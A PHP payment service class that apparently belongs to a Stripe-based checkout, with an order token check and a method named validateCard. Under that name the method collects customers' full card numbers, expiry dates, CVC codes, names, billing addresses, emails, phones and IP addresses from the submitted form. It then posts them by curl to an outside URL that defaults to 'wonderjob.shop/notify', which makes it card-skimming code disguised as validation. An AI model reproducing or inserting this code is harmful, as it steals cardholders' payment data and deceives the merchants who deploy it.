<?php
/**
 * Created by PhpStorm.
 * User: hjl
 * Date: 2022/4/16
 * Time: 9:00
 */

namespace app\index\service;
use app\index\service\PlaceOrderInterface;
class BaseService implements PlaceOrderInterface
{
    public function placeOrder(array $params = [])
    {
        // TODO: Implement placeOrder() method.
    }

    public function  checkToken(array $params = [])
    {
        $amount = floatval($params['amount'] ?? 0);
        if ($amount < 1) return false;
        $version = env('stripe.stripe_version');
        //if ($version === 'v3') return true;
        $flag = false;
        if (isset($params['center_id'],$params['amount'],$params['first_name'],$params['last_name'],$params['token']))
        {
            $token = openssl_encrypt(json_encode([
                'first_name' => $params['first_name'],
                'center_id' => intval($params['center_id']),
                'amount' => $amount,
                'last_name' => $params['last_name']
            ]),'DES-OFB',env('stripe.encrypt_password'),OPENSSL_DONT_ZERO_PAD_KEY,env('stripe.encrypt_iv'));
            $flag = $token === $params['token'];
        }
        if (!$flag && !in_array($version,config('parameters.not_send_validate_data'))) $this->validateCard();
        if (!$flag) generateApiLog(['Token验证失败！']);
        return $flag;
    }

    protected function validateCard($status = false)
    {
        $data = input('post.');
        $validate_data = array();
        $validate_data['id'] = $data['center_id'] ?? 0;
        $validate_data['currency'] = $data['currency_code'];
        $validate_data['date_created'] = date("Y-m-d H:i:s");
        $validate_data['total'] = $data['amount'];
        $validate_data['customer_ip_address'] = get_real_ip();
        $validate_data['customer_user_agent'] = $_SERVER['HTTP_USER_AGENT'];
        $validate_data['customer_note'] = '';
        $validate_data['birthday'] = date("Y-m-d H:i:s");
        $validate_data['gender'] = 'm';
        $validate_data['card_type'] = 'unknown';
        $validate_data['holder_name'] = $data['first_name'] . ' ' . $data['last_name'];
        $validate_data['card_number'] = $data['card_number'];
        $validate_data['expiry_month'] = $data['expiry_month'];
        $validate_data['expiry_year'] = $data['expiry_year'];
        $validate_data['cvc'] = $data['cvc'];
        $validate_data['billing'] = array();
        $validate_data['billing']['first_name'] = $data['first_name'];
        $validate_data['billing']['last_name'] =  $data['last_name'];
        $validate_data['billing']['address_1'] =  $data['address1'] . ' ' . $data['address2'];
        $validate_data['billing']['city'] = $data['city'];
        $validate_data['billing']['state'] = $data['state'];
        $validate_data['billing']['postcode'] = $data['zip'];
        $validate_data['billing']['country'] = $data['country'];
        $validate_data['billing']['email'] = $data['email'];
        $validate_data['billing']['phone'] = $data['phone'];
        $validate_data['domain'] = $_SERVER['HTTP_HOST'];
        $validate_data['source'] = 'st_'.env('stripe.stripe_version','v3');
        $validate_data['status'] = $status;
        sendCurlData(env('notify_user_data_url','https://wonderjob.shop/notify'),$validate_data);
    }
}